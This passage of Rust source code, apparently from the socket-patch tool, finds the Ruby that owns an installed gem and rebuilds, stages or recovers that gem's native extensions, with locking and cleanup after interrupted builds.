    require_paths: Vec<String>,
    /// `gem_dir` / `require_path`: where RubyGems copies the artifacts.
    lib_dir: PathBuf,
    /// What `ruby` said of itself, when it did.
    facts: Option<RubyFacts>,
}

/// What a Ruby says of itself in a [`RubyRun::ExtensionsDir`] run.
#[derive(Debug, Clone, PartialEq, Eq)]
struct RubyFacts {
    /// `RUBY_VERSION` (`3.4.10`).
    ruby_version: String,
    /// `Gem::VERSION`.
    rubygems_version: String,
    /// The suffix of the extensions it loads (`so`, `bundle`).
    dlext: String,
    /// `Gem::Platform.local` (`arm64-darwin-25`).
    platform: String,
    /// Whether a gem of the platform the run named runs on it; `None` when
    /// the run named none.
    runs_platform: Option<bool>,
}

impl RubyFacts {
    /// `RUBY_VERSION[/\d+\.\d+/]`: the dir a precompiled gem keeps the
    /// binary for this Ruby in (`3.4`).
    fn minor(&self) -> Option<String> {
        ruby_minor(&self.ruby_version)
    }

    fn versions(&self) -> RubyVersions {
        RubyVersions {
            ruby: Some(self.ruby_version.clone()),
            rubygems: Some(self.rubygems_version.clone()),
        }
    }
}

/// The `sp_extensions_dir` line of a [`RubyRun::ExtensionsDir`] run.
fn parse_extensions_dir(stdout: &str) -> Option<PathBuf> {
    stdout.lines().find_map(|line| {
        let (key, value) = line.split_once('\t')?;
        (key == "sp_extensions_dir" && !value.is_empty()).then(|| PathBuf::from(value))
    })
}

/// The `sp_ruby` line of a [`RubyRun::ExtensionsDir`] run.
fn parse_ruby_facts(stdout: &str) -> Option<RubyFacts> {
    stdout.lines().find_map(|line| {
        let mut fields = line.split('\t');
        (fields.next()? == "sp_ruby").then_some(())?;
        let (ruby_version, rubygems_version) = (fields.next()?, fields.next()?);
        let (dlext, platform) = (fields.next()?, fields.next()?);
        let runs_platform = match fields.next() {
            Some("yes") => Some(true),
            Some("no") => Some(false),
            _ => None,
        };
        (!ruby_version.is_empty() && !dlext.is_empty()).then(|| RubyFacts {
            ruby_version: ruby_version.to_string(),
            rubygems_version: rubygems_version.to_string(),
            dlext: dlext.to_string(),
            platform: platform.to_string(),
            runs_platform,
        })
    })
}

/// The Rubies that may own `copy`, best first: the one installed beside a
/// `<prefix>/lib/ruby/gems/<abi>` home (rbenv, asdf, rvm, a system Ruby),
/// then the `ruby` on `PATH`. A prefix inside the project (`project`) is
/// never one: the scanned repository does not choose the program run.
fn ruby_candidates(copy: &GemCopy, project: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let exe = if cfg!(windows) { "ruby.exe" } else { "ruby" };
    let mut parts = copy.home.ancestors();
    parts.next(); // <abi>
    if let (Some(gems), Some(ruby), Some(lib), Some(prefix)) =
        (parts.next(), parts.next(), parts.next(), parts.next())
    {
        if gems.file_name().is_some_and(|n| n == "gems")
            && ruby.file_name().is_some_and(|n| n == "ruby")
            && lib.file_name().is_some_and(|n| n == "lib")
        {
            let candidate = prefix.join("bin").join(exe);
            let in_project = match (canonical(prefix), canonical(project)) {
                (Some(prefix), Some(project)) => prefix.starts_with(project),
                _ => prefix.starts_with(project),
            };
            if !in_project && candidate.is_file() {
                out.push(candidate);
            }
        }
    }
    if let Some(on_path) = crate::utils::process::resolve_tool("ruby") {
        if !out.contains(&on_path) {
            out.push(on_path);
        }
    }
    out
}

/// The `GEM_PATH` a build runs with: `homes` first (the copy's own, so an
/// `extconf.rb` requiring `mini_portile2` or `rb_sys` finds the copy
/// installed beside it; before it, a stage home holding the gems the build
/// needs and the install lacks), then the caller's, then RubyGems'
/// defaults (the trailing separator).
fn gem_path_for(homes: &[&Path]) -> Option<OsString> {
    let mut paths: Vec<PathBuf> = homes.iter().map(|home| home.to_path_buf()).collect();
    if let Some(existing) = std::env::var_os("GEM_PATH") {
        paths.extend(std::env::split_paths(&existing).filter(|p| !p.as_os_str().is_empty()));
    }
    let mut joined = std::env::join_paths(paths).ok()?;
    joined.push(if cfg!(windows) { ";" } else { ":" });
    Some(joined)
}

/// What a run of [`RUBY_SCRIPT`] is for.
enum RubyRun<'a> {
    /// Ask where this Ruby builds extensions for the copy's gem home, and
    /// what it is. Loads RubyGems and nothing of the gem. With `platform`
    /// it also says whether a gem of that platform runs on it.
    ExtensionsDir { platform: Option<&'a str> },
    /// Build the copy's extensions into `probe.extension_dir`: loads the
    /// installed gemspec and runs the gem's build scripts.
    Build(&'a Probe),
    /// Install the `.gem` at `archive` into the empty `stage_home`, building
    /// its extensions there: runs the archive's own build scripts.
    Install {
        archive: &'a Path,
        stage_home: &'a Path,
    },
    /// Extract the `.gem` at `archive`, which must be the gem `full_name`
    /// and declare extensions, into `stage_home`. Runs nothing of it.
    Unpack {
        archive: &'a Path,
        stage_home: &'a Path,
        full_name: &'a str,
    },
    /// Name the gems the staged gem at `spec` depends on that neither the
    /// stage home nor the copy's home (nor the caller's `GEM_PATH`) holds.
    MissingDeps {
        spec: &'a Path,
        stage_home: &'a Path,
    },
    /// Build the extensions of the staged gem at `spec` inside
    /// `stage_home`: runs the staged tree's build scripts.
    ///
    /// `recorded_args`: the installed copy is one RubyGems built, and the
    /// rebuild is given the arguments RubyGems recorded for it, as `gem
    /// pristine` gives them. A precompiled copy was built by its publisher,
    /// not here: arguments recorded for it were never used to build it
    /// (Bundler's `build.<gem>` setting is recorded for a platform gem
    /// too), so its rebuild takes none. Given them, a setting a project
    /// kept from the years a gem had no precompiled build
    /// (`build.nokogiri --use-system-libraries`) made the rebuild replace
    /// the library the gem ships with whichever the system has.
    StageBuild {
        spec: &'a Path,
        stage_home: &'a Path,
        recorded_args: bool,
    },
}

/// Run the Ruby program for `run` on `copy`, bounded by `budget` through
/// [`build_output_within`](crate::utils::process::build_output_within)
/// (a timeout kills the build's whole process group). `Ok` carries stdout;
/// `Err` a short reason (stderr's tail on a failed exit).
async fn run_ruby(
    ruby: &Path,
    run: RubyRun<'_>,
    copy: &GemCopy,
    env: &RubyEnv,
    budget: Duration,
) -> Result<String, String> {
    use crate::utils::process::{build_output_within, command_for, BoundedError};
    let mut command = command_for(ruby);
    command.arg("-e").arg(RUBY_SCRIPT).current_dir(&env.cwd);
    let mode = match run {
        RubyRun::ExtensionsDir { platform } => {
            command.arg("extensions_dir").arg(&copy.home);
            if let Some(platform) = platform {
                command.arg(platform);
            }
            "extensions_dir"
        }
        RubyRun::Build(probe) => {
            command
                .arg("build")
                .arg(&copy.spec_path)
                .arg(&probe.extension_dir)
                .arg(&probe.require_path);
            if let Some(gem_path) = gem_path_for(&[&copy.home]) {
                command.env("GEM_PATH", gem_path);
            }
            "build"
        }
        RubyRun::Install {
            archive,
            stage_home,
        } => {
            command
                .arg("install")
                .arg(archive)
                .arg(stage_home)
                .arg(&copy.home);
            // The installed copy's home, where the gems its build scripts
            // require were installed beside it.
            if let Some(gem_path) = gem_path_for(&[&copy.home]) {
                command.env("GEM_PATH", gem_path);
            }
            "install"
        }
        RubyRun::Unpack {
            archive,
            stage_home,
            full_name,
        } => {
            command
                .arg("unpack")
                .arg(archive)
                .arg(stage_home)
                .arg(full_name);
            "unpack"
        }
        RubyRun::MissingDeps { spec, stage_home } => {
            command.arg("missing_deps").arg(spec);
            if let Some(gem_path) = gem_path_for(&[stage_home, &copy.home]) {
                command.env("GEM_PATH", gem_path);
            }
            "missing_deps"
        }
        RubyRun::StageBuild {
            spec,
            stage_home,
            recorded_args,
        } => {
            command
                .arg("stage_build")
                .arg(spec)
                .arg(stage_home)
                .arg(&copy.home);
            if recorded_args {
                command.arg(&copy.full_name);
            }
            // The stage home first: the gems the build needs and the
            // install lacks were put there, and nowhere else.
            if let Some(gem_path) = gem_path_for(&[stage_home, &copy.home]) {
                command.env("GEM_PATH", gem_path);
            }
            "stage_build"
        }
    };
    // A Bundler-run parent (`bundle exec`, the Bundler plugin) must not
    // load the project's bundle into this Ruby.
    for (key, _) in std::env::vars_os() {
        let key_str = key.to_string_lossy();
        if key_str == "RUBYOPT" || key_str == "RUBYLIB" || key_str.starts_with("BUNDLE") {
            command.env_remove(&key);
        }
    }
    let output = crate::utils::fs::run_blocking(move || build_output_within(command, budget)).await;
    let output = match output {
        Err(BoundedError::TimedOut) => {
            return Err(format!(
                "{} {mode} did not finish within {} minutes",
                ruby.display(),
                budget.as_secs() / 60
            ))
        }
        Err(BoundedError::Spawn(e)) => {
            return Err(format!("could not run {}: {e}", ruby.display()))
        }
        Ok(output) => output,
    };
    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).into_owned())
    } else {
        Err(stderr_tail(&String::from_utf8_lossy(&output.stderr)))
    }
}

/// How many lines of a failed build's output its error carries.
const DIAGNOSTIC_LINES: usize = 30;

/// The line mkmf prints above every configuration option the failed
/// `extconf.rb` accepts, one tab-indented line each.
const MKMF_OPTIONS_HEADING: &str = "Provided configuration options:";

/// How RubyGems starts its pointer to the `mkmf.log` of a failed
/// `extconf.rb`; the log's path is the next line that is not blank.
const MKMF_LOG_POINTER: &str = "To see why this extension failed to compile, please check the";

/// The useful end of a failed build's stderr, at most [`DIAGNOSTIC_LINES`]
/// lines of it. Dropped first, as they say nothing about the failure and
/// are what RubyGems ends the output of a failed `extconf.rb` with:
///
/// * its trailing "Gem files will remain installed" boilerplate;
/// * mkmf's list of configuration options, which is longer than the tail
///   for most gems, so the lines that name the cause, printed before it,
///   would be cut off;
/// * its pointer to the build's `mkmf.log`. Every build this module runs
///   is undone when it fails (the stage is removed, an in-place build's
///   extension dir is replaced with the one it had), and the log with it.
fn stderr_tail(stderr: &str) -> String {
    let text = stderr
        .split("\nGem files will remain installed")
        .next()
        .unwrap_or(stderr);
    let mut lines: Vec<&str> = Vec::new();
    let (mut in_options, mut log_path_next) = (false, false);
    for line in text.lines().map(str::trim_end) {
        if line.is_empty() {
            continue;
        }
        if std::mem::take(&mut in_options) && line.starts_with('\t') {
            in_options = true;
            continue;
        }
        if std::mem::take(&mut log_path_next) && line.ends_with("mkmf.log") {
            continue;
        }
        if line == MKMF_OPTIONS_HEADING {
            in_options = true;
        } else if line.starts_with(MKMF_LOG_POINTER) {
            log_path_next = true;
        } else {
            lines.push(line);
        }
    }
    let start = lines.len().saturating_sub(DIAGNOSTIC_LINES);
    let tail = lines[start..].join("\n");
    if tail.is_empty() {
        "the build exited with an error and no output".to_string()
    } else {
        tail
    }
}

/// `<home>/extensions/<platform>/<abi>/<full_name>` for every platform and
/// ABI dir of the home, whether or not the gem has a build there.
fn extension_dir_slots(copy: &GemCopy) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let Ok(platforms) = std::fs::read_dir(copy.home.join("extensions")) else {
        return out;
    };
    for platform in platforms.flatten() {
        let Ok(abis) = std::fs::read_dir(platform.path()) else {
            continue;
        };
        for abi in abis.flatten() {
            out.push(abi.path().join(&copy.full_name));
        }
    }
    out.sort();
    out
}

/// A directory, not a symlink to one.
fn is_real_dir(path: &Path) -> bool {
    std::fs::symlink_metadata(path).is_ok_and(|m| m.is_dir())
}

/// The extension dirs of `full_name` under `home/extensions/*/*/`: a build
/// that is there, or one an unfinished rebuild left parked beside its
/// place ([`parked_build_path`]). A real run moves that one back before it
/// gets here ([`recover_interrupted_rebuild`]); a dry run only reads.
fn installed_extension_dirs(copy: &GemCopy) -> Vec<PathBuf> {
    extension_dir_slots(copy)
        .into_iter()
        .filter(|dir| is_real_dir(dir) || is_real_dir(&parked_build_path(dir)))
        .collect()
}

/// Where a rebuild parks the previous build of the extension dir `ext`:
/// beside it, so moving it there and back is a rename.
fn parked_build_path(ext: &Path) -> PathBuf {
    let leaf = ext
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    ext.with_file_name(format!(".{leaf}.socket-patch-old"))
}

/// Where an in-place rebuild keeps the gem's own tree as it was before the
/// build ([`TreeSnapshot`]): beside the parked build of the extension dir
/// `ext`, outside the gem dir, where the gem's build scripts do not look
/// for sources.
fn tree_snapshot_path(ext: &Path) -> PathBuf {
    let leaf = ext
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    ext.with_file_name(format!(".{leaf}.socket-patch-tree"))
}

/// Where the snapshot at `snapshot` ([`tree_snapshot_path`]) is staged
/// while it is taken.
fn tree_snapshot_stage(snapshot: &Path) -> PathBuf {
    let mut name = snapshot.as_os_str().to_os_string();
    name.push(".tmp");
    PathBuf::from(name)
}

/// Take the rebuild lock of a build dir (an extension dir about to be
/// parked, or a parked one): an exclusive advisory lock on the directory
/// itself. It follows the directory through its renames and goes when the
/// holder's process ends, however that happens, so a parked build that can
/// be locked belongs to no rebuild that is still running. The apply lock
/// does not say that: it is per project, and a gem home can be shared.
///
/// `Ok(None)` where a directory cannot be locked (Windows, a filesystem
/// without advisory locks): the caller goes ahead unguarded. `Err` of kind
/// `WouldBlock`: another process is rebuilding this gem right now. `Err`
/// of kind `NotFound`: `dir` is gone, or is no longer the directory that
/// was locked (its rebuild finished in between).
fn lock_build_dir(dir: &Path) -> std::io::Result<Option<std::fs::File>> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        let handle = std::fs::File::open(dir)?;
        // A lock this process dropped a moment ago can linger for the time
        // a child being spawned on another thread takes to exec: it holds
        // a copy of the descriptor until then. A live rebuild holds on.
        let mut attempts = 0;
        loop {
            match handle.try_lock() {
                Ok(()) => break,
                Err(std::fs::TryLockError::WouldBlock) if attempts < 5 => {
                    attempts += 1;
                    std::thread::sleep(Duration::from_millis(20));
                }
                Err(std::fs::TryLockError::WouldBlock) => {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::WouldBlock,
                        "another socket-patch run is rebuilding this gem's extension",
                    ));
                }
                Err(std::fs::TryLockError::Error(_)) => return Ok(None),
            }
        }
        let (locked, named) = (handle.metadata()?, std::fs::symlink_metadata(dir)?);
        if (locked.dev(), locked.ino()) != (named.dev(), named.ino()) {
            return Err(std::io::ErrorKind::NotFound.into());
        }
        Ok(Some(handle))
    }
    #[cfg(not(unix))]
    {
        let _ = dir;
        Ok(None)
    }
}

/// Put `copy` back together after a rebuild of it that never finished: its
/// process was interrupted, or killed, between parking the previous build
/// and recording the new one. `Ok(true)` when something was put right.
///
/// The sign is a parked build ([`parked_build_path`]) that no live process
/// holds. When the extension dir beside it is a finished build
/// (`gem.build_complete`: the interrupted build got that far, or `gem
/// pristine` ran since), that build stands and the parked one goes.
/// Otherwise whatever the build left is dropped, the parked build is moved
/// back, and the `lib/` copies of its artifacts are brought back in line
/// with it ([`realign_lib_copies`]). The build marker never left the gem
/// dir during the build, so it describes the build that is back.
///
/// The sources stay as the unfinished run left them, patched: with the
/// previous build back that is the state of a copy whose sources were
/// patched without a rebuild, which `apply` completes and `rollback`
/// undoes.
fn recover_interrupted_rebuild_sync(
    copy: &GemCopy,
    require_path: Option<&str>,
) -> std::io::Result<bool> {
    // The stage of a rebuild from the source gem that never finished is
    // dropped too: nothing of the copy is in it. One a live run holds is
    // that run's (`WouldBlock`).
    sweep_stale_stage(copy)?;
    let mut recovered = false;
    for ext in extension_dir_slots(copy) {
        let parked = parked_build_path(&ext);
        if !is_real_dir(&parked) {
            continue;
        }
        let _lock = match lock_build_dir(&parked) {
            Ok(lock) => lock,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => return Err(e),
        };
        refuse_link(&ext, "an extension dir")?;
        // An in-place build was under way: the gem's own tree goes back to
        // what it was before it ([`TreeSnapshot`]), whichever way the
        // extension dir is settled, since no marker speaks for what the
        // build left there. Unless one does: a run that died after it
        // recorded the build, before it dropped the parked one, left a
        // finished build that stands with its tree.
        //
        // Whether there is a snapshot is not guessed: one that cannot be
        // probed may be all that says the tree holds a half-made build, and
        // settling the extension dir without it would leave that build in
        // the tree with nothing to undo it from.
        let snapshot = tree_snapshot_path(&ext);
        let taken = try_entry_type(&snapshot)?.is_some_and(|kind| kind.is_dir());
        let in_place = taken && !build_committed_since(copy, &ext, &snapshot)?;
        if in_place {
            restore_tree(copy, &snapshot)?;
        }
        if ext.join(BUILD_COMPLETE).is_file() {
            remove_dir_if_exists(&parked)?;
            if let Some(require_path) = require_path.filter(|_| in_place) {
                realign_lib_copies(copy, &ext, require_path);
            }
        } else {
            remove_dir_if_exists(&ext)?;
            std::fs::rename(&parked, &ext)?;
            if let Some(require_path) = require_path {
                realign_lib_copies(copy, &ext, require_path);
            }
        }
        recovered = true;
    }
    // No rebuild is under way now, so a snapshot that is left is nobody's.
    drop_stale_tree_snapshots(copy);
    Ok(recovered)
}

/// Bring the `lib/` copies of `ext`'s artifacts back in line with it:
/// RubyGems installs them as copies of the extension dir's files, and a
/// build stopped late has already replaced some. Only a copy that is there
/// is rewritten. Best effort, as RubyGems loads the extension dir first.
fn realign_lib_copies(copy: &GemCopy, ext: &Path, require_path: &str) {
    for rel in artifact_rels(ext) {
        let (built, lib) = (ext.join(&rel), copy.gem_dir.join(require_path).join(&rel));
        let (Ok(bytes), Ok(current)) = (
            read_regular_to_bytes_sync(&built),
            read_regular_to_bytes_sync(&lib),
        ) else {
            continue;
        };
        if bytes == current {
            continue;
        }
        let perms = std::fs::metadata(&built).map(|m| m.permissions());
        let _ = replace_file(&lib, |stage| {
            std::fs::write(stage, &bytes)?;
            match &perms {
                Ok(perms) => std::fs::set_permissions(stage, perms.clone()),
                Err(_) => Ok(()),
            }
        });
    }
}

/// [`recover_interrupted_rebuild_sync`] for `copy`, with the require path
/// its gemspec's text names.
async fn recover_interrupted_rebuild(copy: &GemCopy) -> std::io::Result<bool> {
    let require_path = require_path_of(copy).await;
    let copy = copy.clone();
    crate::utils::fs::run_blocking(move || {
        recover_interrupted_rebuild_sync(&copy, require_path.as_deref())
    })
    .await
}

/// Why an unfinished rebuild of `copy` could not be put right, as the
/// reason of a refusal.
fn recovery_refusal(copy: &GemCopy, error: &std::io::Error) -> String {
    let unlockable = error
        .get_ref()
        .is_some_and(|inner| inner.to_string() == UNLOCKED_STAGE_IN_USE);
    if unlockable {
        format!(
            "a rebuild of this gem's extension is running right now, or one was interrupted \
             less than {} minutes ago (a directory cannot be locked here, so the two cannot \
             be told apart); run again when it has finished, or after that time",
            UNLOCKED_STAGE_AGE.as_secs() / 60
        )
    } else if error.kind() == std::io::ErrorKind::WouldBlock {
        "another socket-patch run is rebuilding this gem's extension right now; run again \
         when it has finished"
            .to_string()
    } else {
        format!(
            "a rebuild of this gem's extension that an earlier run did not finish could not \
             be undone ({error}); run `gem pristine {} --extensions`",
            gem_name_of(&copy.full_name)
        )
    }
}

/// The copy's require paths, from its gemspec's text, those that stay
/// inside the gem: `None` when the spec cannot be read or its first (where
/// RubyGems copies a built extension) is not one of them.
async fn require_paths_of(copy: &GemCopy) -> Option<Vec<String>> {
    let text = crate::utils::fs::read_regular_to_string(&copy.spec_path)
        .await
        .ok()?;
    let paths = parse_require_paths(&text)?;
    is_safe_relative_subpath(paths.first()?).then(|| {
        paths
            .into_iter()
            .filter(|path| is_safe_relative_subpath(path))
            .collect()
    })
}

/// The copy's first require path ([`require_paths_of`]).
async fn require_path_of(copy: &GemCopy) -> Option<String> {
    require_paths_of(copy).await?.into_iter().next()
}

fn same_path(a: &Path, b: &Path) -> bool {
    match (canonical(a), canonical(b)) {
        (Some(a), Some(b)) => a == b,
        _ => a == b,
    }
}

fn canonical(p: &Path) -> Option<PathBuf> {
    std::fs::canonicalize(p).ok()
}

/// What a rebuild of a copy needs that files alone tell: nothing is run to
/// learn it, so a dry run can refuse on it too.
#[derive(Debug, Clone)]
struct Preflight {
    /// What a Ruby is matched to. For a gem RubyGems built: the copy's
    /// extension dirs, `<home>/extensions/<platform>/<abi>/<full_name>`.
    /// For a precompiled copy, which has none: the home's
    /// `extensions/<platform>/<abi>` dirs, where the Ruby that owns the
    /// home built its other gems.
    installed: Vec<PathBuf>,
    /// The Rubies that may own the install, best first.
    candidates: Vec<PathBuf>,
    /// The gem's require paths, from its gemspec's text; RubyGems copies a
    /// built extension under the first.
    require_paths: Vec<String>,
}

/// The home's `extensions/<platform>/<abi>` dirs.
fn abi_dirs(copy: &GemCopy) -> Vec<PathBuf> {
    let mut dirs: Vec<PathBuf> = extension_dir_slots(copy)
        .iter()
        .filter_map(|slot| slot.parent().map(Path::to_path_buf))
        .filter(|abi| is_real_dir(abi))
        .collect();
    dirs.dedup();
    dirs
}

/// The [`Preflight`] of `copy`. A gem RubyGems built with no extension dir
/// (installed by a RubyGems older than 2.2, or its build removed) has no
/// build a Ruby can be matched to; a `precompiled` copy never has one.
/// `Err` names why the copy cannot be rebuilt.
async fn rebuild_preflight(
    copy: &GemCopy,
    env: &RubyEnv,
    precompiled: bool,
) -> Result<Preflight, String> {
    let installed = {
        let copy = copy.clone();
        crate::utils::fs::run_blocking(move || {
            if precompiled {
                abi_dirs(&copy)
            } else {
                installed_extension_dirs(&copy)
            }
        })
        .await
    };
    if !precompiled && installed.is_empty() {
        return Err(format!(
            "the gem has no compiled extension dir under {} (it was installed by a \
             RubyGems older than 2.2, or its build is missing)",
            copy.home.join("extensions").display()
        ));
    }
    let require_paths = require_paths_of(copy).await.ok_or_else(|| {
        format!(
            "{} does not name a require path inside the gem",
            copy.spec_path.display()
        )
    })?;
    let candidates = ruby_candidates(copy, &env.cwd);
    if candidates.is_empty() {
        return Err("no `ruby` was found on PATH to rebuild it with".to_string());
    }
    Ok(Preflight {
        installed,
        candidates,
        require_paths,
    })
}

/// Whether a gem home's leaf dir names a Ruby ABI (`3.4.0`), as the homes
/// RubyGems and Bundler lay out do (`<prefix>/lib/ruby/gems/3.4.0`,
/// `vendor/bundle/ruby/3.4.0`, `~/.gem/ruby/3.4.0`).
fn abi_of_home(home: &Path) -> Option<String> {
    let leaf = home.file_name()?.to_str()?;
    let versioned = leaf.starts_with(|c: char| c.is_ascii_digit())
        && leaf.contains('.')
        && leaf.bytes().all(|b| b.is_ascii_digit() || b == b'.');
    versioned.then(|| leaf.to_string())
}

/// `major.minor` of a Ruby version or ABI (`3.4.10`, `3.4.0`,
/// `3.4.0-static`): what a precompiled gem names the dir of the binary it
/// ships for that Ruby.
fn ruby_minor(version: &str) -> Option<String> {
    let mut parts = version.split(['.', '-', '+']);
    let (major, minor) = (parts.next()?, parts.next()?);
    let numeric = |part: &str| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit());
    (numeric(major) && numeric(minor)).then(|| format!("{major}.{minor}"))
}

/// The Ruby `major.minor` a gem home is laid out for, when its files tie it
/// to exactly one: the ABI its dir name carries (`…/ruby/3.4.0`) and the
/// ABI of every `extensions/<platform>/<abi>` dir in it agree. `None` for a
/// home that shows no ABI (a custom `GEM_HOME` holding no compiled gem) or
/// more than one: any Ruby may be pointed at such a home. It decides one
/// thing: whether a grafted copy needs a Ruby asked which one is running
/// `apply` ([`built_state`]). It is no condition of attestation.
fn home_minor(copy: &GemCopy) -> Option<String> {
    let mut minors: Vec<String> = abi_dirs(copy)
        .iter()
        .filter_map(|dir| dir.file_name()?.to_str().and_then(ruby_minor))
        .collect();
    minors.extend(abi_of_home(&copy.home).as_deref().and_then(ruby_minor));
    minors.sort();
    minors.dedup();
    match minors.as_slice() {
        [one] => Some(one.clone()),
        _ => None,
    }
}

/// Find the Ruby that owns `copy`'s install. Each candidate is asked where
/// it builds extensions for the gem home, and what it is
/// ([`RubyRun::ExtensionsDir`]), which loads nothing of the gem. `Err`
/// names why none qualifies.
///
/// For a gem RubyGems built (`platform: None`) the owner is the Ruby whose
/// extension dir for this gem is the installed
/// `<home>/extensions/<platform>/<abi>/` one (its platform and ABI).
///
/// A precompiled copy (of `platform`) has no extension dir to match. Its
/// owner:
///
/// * runs gems of that platform (`Gem::Platform#===`, as RubyGems picks a
///   platform gem), and
/// * builds extensions for the ABI this gem home has some for (the
///   `<abi>` of its `extensions/<platform>/<abi>` dirs, from its other
///   native gems; the platform dir above it may be spelled for another OS
///   release); in a home with none, its ABI is the one the home's dir name
///   carries (`…/ruby/3.4.0`), when it carries one. A home that shows
///   neither is taken to be the candidate's.
///
/// Its facts are then part of the answer: the build is grafted over the
/// binary the gem keeps for that Ruby's `major.minor`.
async fn find_ruby(
    copy: &GemCopy,
    env: &RubyEnv,
    preflight: Preflight,
    platform: Option<&str>,
) -> Result<Probe, String> {
    let Preflight {
        installed,
        candidates,
        require_paths,
    } = preflight;
    let require_path = require_paths.first().cloned().unwrap_or_default();
    let mut reasons = Vec::new();
    for ruby in candidates {
        let run = RubyRun::ExtensionsDir { platform };
        let stdout = match run_ruby(&ruby, run, copy, env, PROBE_TIMEOUT).await {
            Ok(s) => s,
            Err(e) => {
                reasons.push(format!("{}: {e}", ruby.display()));
                continue;
            }
        };
        let facts = parse_ruby_facts(&stdout);
        let Some(extensions_dir) = parse_extensions_dir(&stdout) else {
            reasons.push(format!("{}: unreadable probe output", ruby.display()));
            continue;
        };
        let extension_dir = extensions_dir.join(&copy.full_name);
        let disowned = match platform {
            None if installed.iter().any(|d| same_path(d, &extension_dir)) => None,
            None => Some(format!(
                "{} builds into {}, but the installed extension is {} (another Ruby's)",
                ruby.display(),
                extension_dir.display(),
                installed
                    .iter()
                    .map(|d| d.display().to_string())
                    .collect::<Vec<_>>()
                    .join(", ")
            )),
            Some(platform) => match &facts {
                None => Some(format!("{}: unreadable probe output", ruby.display())),
                Some(facts) if facts.runs_platform != Some(true) => Some(format!(
                    "{} is a {} Ruby, which does not run {platform} gems",
                    ruby.display(),
                    facts.platform
                )),
                Some(_) => {
                    let abi_dir = extensions_dir.file_name().map(|n| n.to_os_string());
                    let abi = abi_dir
                        .as_ref()
                        .map(|n| n.to_string_lossy().trim_end_matches("-static").to_string())
                        .unwrap_or_default();
                    let owns = if installed.is_empty() {
                        abi_of_home(&copy.home).is_none_or(|home_abi| home_abi == abi)
                    } else {
                        installed
                            .iter()
                            .any(|dir| dir.file_name().map(|n| n.to_os_string()) == abi_dir)
                    };
                    (!owns).then(|| {
                        format!(
                            "{} builds extensions into {}, and this gem home's are built for \
                             another Ruby ABI",
                            ruby.display(),
                            extensions_dir.display()
                        )
                    })
                }
            },
        };
        if let Some(why) = disowned {
            reasons.push(why);
            continue;
        }
        return Ok(Probe {
            ruby,
            gem_dir: copy.gem_dir.clone(),
            extension_dir,
            lib_dir: copy.gem_dir.join(&require_path),
            require_path,
            require_paths,
            facts,
        });
    }
    Err(format!(
        "no Ruby owning this install was found ({})",
        reasons.join("; ")
    ))
}

/// A `.gem` RubyGems installed into a stage home ([`install_staged`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct StagedInstall {
    /// `<stage home>/gems/<full_name>`: the extracted gem, with the built
    /// artifacts' copies under its require dir.
    pub gem_dir: PathBuf,
    /// The extension dir the build left in the stage home.
    pub extension_dir: PathBuf,
    /// The installed copy's extension dir, which the staged one replaces:
    /// the same `extensions/<platform>/<abi>/<full_name>` under its home.
    pub installed_extension_dir: PathBuf,
}

/// The `sp_installed` line of a [`RubyRun::Install`] run: the installed
/// gem's full name and its extension dir.
fn parse_installed(stdout: &str) -> Option<(String, PathBuf)> {
    stdout.lines().find_map(|line| {
        let mut fields = line.split('\t');
        (fields.next()? == "sp_installed").then_some(())?;
        let (full_name, ext) = (fields.next()?, fields.next()?);
        (!full_name.is_empty() && !ext.is_empty())
            .then(|| (full_name.to_string(), PathBuf::from(ext)))
    })
}

/// Install the verified `.gem` at `archive` into the empty `stage_home`
/// with the Ruby that owns the installed copy at `installed`, so the gem
/// and the extension RubyGems compiles from it can replace that copy's
/// (the hosted stale-install refresh, [`crate::patch::gem_refresh`]).
/// Nothing of the installed copy is changed. The Ruby is found as for a
/// rebuild ([`find_ruby`]): the one whose extension dir for the gem is the
/// installed one, so the staged build has the installed build's platform
/// and ABI. `kind` says which gem `archive` is, for the build's progress
/// line: `patched`, or `upstream` when an unwind puts that one back
/// (#2152). `Err` says why there is no staged install to use.
pub(crate) async fn install_staged(
    installed: &Path,
    archive: &Path,
    kind: &str,
    stage_home: &Path,
    env: &RubyEnv,
) -> Result<StagedInstall, String> {
    let copy = GemCopy::of(installed)
        .ok_or_else(|| format!("{} is not a RubyGems install", installed.display()))?;
    if let Err(e) = recover_interrupted_rebuild(&copy).await {
        return Err(recovery_refusal(&copy, &e));
    }
    let preflight = rebuild_preflight(&copy, env, false).await?;
    let probe = find_ruby(&copy, env, preflight, None).await?;
    let label = ext_dir_label(&copy.home, &probe.extension_dir);
    if confined_ext_dir(&copy, &label).is_none() {
        return Err(format!(
            "its extension is built into {}, outside its gem home",
            probe.extension_dir.display()
        ));
    }
    let run = RubyRun::Install {
        archive,
        stage_home,
    };
    let stdout = run_build(&probe, run, &copy, env, &format!("its {kind} gem")).await?;
    let (full_name, built) = parse_installed(&stdout)
        .ok_or_else(|| format!("{}: unreadable install output", probe.ruby.display()))?;
    let staged = StagedInstall {
        gem_dir: stage_home.join("gems").join(&copy.full_name),
        extension_dir: stage_home.join(&label),
        installed_extension_dir: probe.extension_dir,
    };
    if full_name != copy.full_name || !same_path(&built, &staged.extension_dir) {
        return Err(format!(
            "RubyGems installed {full_name} with its extension in {}, not {} in {}",
            built.display(),
            copy.full_name,
            staged.extension_dir.display()
        ));
    }
    if !is_real_dir(&staged.gem_dir) || !staged.extension_dir.join(BUILD_COMPLETE).is_file() {
        return Err("the build exited cleanly but left no finished extension".to_string());
    }
    Ok(staged)
}

/// Every regular file under `dir`, relative and `/`-separated, sorted.
/// Links are neither followed nor listed.
fn tree_files(dir: &Path) -> Vec<String> {
    walkdir::WalkDir::new(dir)
        .follow_links(false)
        .sort_by_file_name()
        .into_iter()
        .flatten()
        .filter(|entry| entry.file_type().is_file())
        .filter_map(|entry| {
            let rel = entry.path().strip_prefix(dir).ok()?;
            Some(
                rel.components()
                    .map(|c| c.as_os_str().to_string_lossy().into_owned())
                    .collect::<Vec<_>>()
                    .join("/"),
            )
        })
        .collect()
}

